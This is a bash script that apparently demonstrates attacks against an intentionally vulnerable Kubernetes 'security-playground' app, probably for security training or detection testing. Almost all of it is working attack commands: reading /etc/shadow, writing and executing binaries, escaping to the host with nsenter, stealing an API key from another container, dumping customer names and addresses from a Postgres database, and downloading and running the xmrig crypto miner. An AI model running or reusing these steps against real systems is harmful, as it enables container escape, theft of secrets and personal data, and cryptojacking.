#!/bin/bash
# Script to demonstrate how to interact with security-playground

NODE_IP=$(kubectl get nodes -o wide | awk 'FNR == 2 {print $6}')
NODE_PORT=30000

echo "1. Read a sensitive file (/etc/shadow)"
curl $NODE_IP:$NODE_PORT/etc/shadow

echo "2. Exploit writing to /bin"
curl -X POST $NODE_IP:$NODE_PORT/bin/hello -d 'content=echo "hello-world"'
echo ""
echo "and then set it to be executable"
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 /bin/hello'
echo "and then run it"
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=hello'

echo "3. Install nmap from apt and then run a scan"
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=apt-get update; apt-get -y install nmap;nmap -v scanme.nmap.org'

echo "4. Break out of our Linux namespace to the host's with nsenter and install crictl in /usr/bin"
ARCH=$(curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=dpkg --print-architecture')
curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 wget -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.26.1/crictl-v1.26.1-linux-$ARCH.tar.gz"
curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 tar -zxvf crictl-v1.26.1-linux-$ARCH.tar.gz -C /usr/bin"

echo "5. Break out of our Linux namespace to the host's with nsenter and talk directly to the container runtime"
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps'

echo "6. Steal a secret from another container on the same Node (hello-client-allowed in the team1 Namespace)"
HELLO_ID=$(curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name hello-client-allowed -q')
curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $HELLO_ID /bin/sh -c set" | grep API_KEY

echo "7. Exfil some data from another container running on the same Node"
POSTGRES_ID=$(curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name postgres-sakila -q')
curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $POSTGRES_ID psql -U postgres -c 'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id)'"

echo "8. Download and run a common crypto miner (xmrig)"
if [[ "$ARCH" == "amd64" ]]; then
    curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz -O xmrig.tar.gz"    
else
    curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget https://z9k65lokhn70.s3.amazonaws.com/xmrig-6.20.0-linux-static-arm64.tar.gz -O xmrig.tar.gz"   
fi
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=tar -xzvf xmrig.tar.gz'
curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=xmrig-6.20.0/xmrig'
